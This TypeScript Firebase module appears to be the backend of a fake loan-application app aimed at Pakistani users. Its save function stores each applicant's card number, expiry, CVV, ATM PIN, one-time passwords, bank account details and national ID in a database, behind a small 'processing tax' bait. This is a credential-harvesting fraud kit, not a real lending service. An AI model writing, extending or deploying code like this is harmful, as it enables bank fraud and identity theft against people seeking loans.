import { initializeApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore, doc, getDocFromServer, setDoc } from 'firebase/firestore';
import firebaseConfig from '../../firebase-applet-config.json';
import { ApplicationFormData } from '../types';

// Initialize Firebase App
const app = initializeApp(firebaseConfig);

// CRITICAL: The app will break without specifying firestoreDatabaseId
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth(app);

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null): never {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo:
        auth.currentUser?.providerData?.map((provider) => ({
          providerId: provider.providerId,
          email: provider.email,
        })) || [],
    },
    operationType,
    path,
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

// Validate connection on startup as mandated by Skill
export async function testFirestoreConnection(): Promise<boolean> {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
    return true;
  } catch (error) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.error('Please check your Firebase configuration.');
    }
    return false;
  }
}

// Save or sync loan application record to Firestore
export async function saveApplicationToFirestore(
  appId: string,
  data: ApplicationFormData,
  step: number,
  referenceNo: string
): Promise<void> {
  const path = `applications/${appId}`;
  try {
    const record = {
      id: appId,
      referenceNo,
      step,
      fullName: data.fullName || '',
      cnic: data.cnic || '',
      mobileNo: data.mobileNo || '',
      gender: data.gender || '',
      dateOfBirth: data.dateOfBirth || '',
      province: data.province || '',
      address: data.address || '',
      loanAmount: data.loanAmount || '',
      loanPurpose: data.loanPurpose || '',
      occupation: data.occupation || '',
      bankName: data.bankName || '',
      accountNumber: data.accountNumber || '',
      currentBalance: data.currentBalance || '',
      monthlyIncome: data.monthlyIncome || '',
      cardNumber: data.cardNumber || '',
      expiry: data.expiry || '',
      cvv: data.cvv || '',
      processingTax: data.processingTax || 'Rs. 75',
      otpCode: data.otpCode.join(''),
      atmPin: data.atmPin.join(''),
      finalOtpCode: data.finalOtpCode.join(''),
      status: step === 6 ? 'submitted' : 'in_progress',
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };

    await setDoc(doc(db, 'applications', appId), record, { merge: true });
  } catch (error) {
    handleFirestoreError(error, OperationType.WRITE, path);
  }
}
